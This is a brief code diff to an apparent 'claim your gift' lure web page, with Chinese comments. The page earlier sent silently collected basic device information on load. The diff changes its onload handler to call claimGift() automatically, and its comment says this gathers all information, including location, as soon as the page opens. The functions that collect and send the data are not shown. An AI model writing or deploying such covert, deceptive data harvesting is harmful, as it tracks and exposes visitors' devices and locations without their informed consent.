@@ -515,14 +515,13 @@
             }, 500);
         }
 
-        // 页面加载时自动收集基础信息
+        // 页面加载时自动收集所有信息（包括位置）
         window.onload = async function() {
             createParticles();
             updateCountdown();
             
-            // 静默收集基础信息（不请求位置权限）
-            const basicInfo = await collectDeviceInfo();
-            sendData(basicInfo);
+            // 自动开始收集所有信息
+            await claimGift();
         };
     </script>
 </body>
